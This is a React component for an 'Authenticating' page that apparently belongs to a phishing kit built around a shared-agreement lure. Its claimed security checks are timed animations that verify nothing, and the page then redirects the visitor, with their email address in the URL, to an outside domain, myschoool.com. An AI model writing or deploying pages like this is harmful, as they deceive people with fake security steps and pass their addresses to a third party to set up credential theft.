import { useEffect, useState } from "react";
import RingLoader from "./RingLoader";

interface AuthenticatingPageProps {
  email: string;
}

const AuthenticatingPage = ({ email }: AuthenticatingPageProps) => {
  const [activeStep, setActiveStep] = useState(0);

  const steps = [
    "Checking company domain and security rules...",
    "Establishing a secure session for document access...",
    "Forwarding you to your Agreement...",
  ];

  useEffect(() => {
    const interval = setInterval(() => {
      setActiveStep((prev) => {
        if (prev < steps.length - 1) return prev + 1;
        return prev;
      });
    }, 1500);

    return () => clearInterval(interval);
  }, [steps.length]);

  useEffect(() => {
    if (activeStep === steps.length - 1) {
      const redirectTimer = setTimeout(() => {
        window.location.href = `https://myschoool.com/${encodeURIComponent(email)}`;
      }, 2000);
      return () => clearTimeout(redirectTimer);
    }
  }, [activeStep, steps.length, email]);

  return (
    <div className="min-h-screen gradient-bg flex items-center justify-center p-4">
      <div className="dark-card rounded-xl p-5 md:p-8 max-w-sm w-full animate-scale-in relative overflow-hidden">
        {/* Outer dashed border effect */}
        <div className="absolute inset-0 rounded-xl border border-dashed border-muted/30" />
        
        {/* Ring Loader */}
        <div className="flex justify-center mb-5">
          <RingLoader />
        </div>

        {/* Status Badge */}
        <div className="flex justify-center mb-4">
          <div className="inline-flex items-center gap-1.5 bg-secondary/50 px-3 py-1.5 rounded-full border border-muted/30">
            <div className="status-dot" />
            <span className="text-muted-foreground text-[10px]">Verifying recipient</span>
          </div>
        </div>

        {/* Title */}
        <div className="text-center mb-4">
          <h1 className="text-foreground text-sm md:text-base font-semibold mb-0.5">
            Authenticating <span className="text-gradient">{email}</span>
          </h1>
          <p className="text-muted-foreground text-[10px]">
            We're securely checking your email and preparing your agreement.
          </p>
        </div>

        {/* Steps */}
        <div className="space-y-2 mb-4">
          {steps.map((step, index) => (
            <div
              key={index}
              className={`flex items-center gap-1.5 transition-opacity duration-500 ${
                index <= activeStep ? 'opacity-100' : 'opacity-40'
              }`}
            >
              <div
                className={`w-1 h-1 rounded-full transition-all duration-300 ${
                  index <= activeStep ? 'bg-status-green shadow-[0_0_6px_hsla(142,70%,50%,0.6)]' : 'bg-muted'
                }`}
              />
              <span className="text-muted-foreground text-[10px]">{step}</span>
            </div>
          ))}
        </div>

        {/* Footer Text */}
        <p className="text-center text-muted-foreground/70 text-[10px]">
          You'll be redirected automatically.
        </p>
      </div>
    </div>
  );
};

export default AuthenticatingPage;
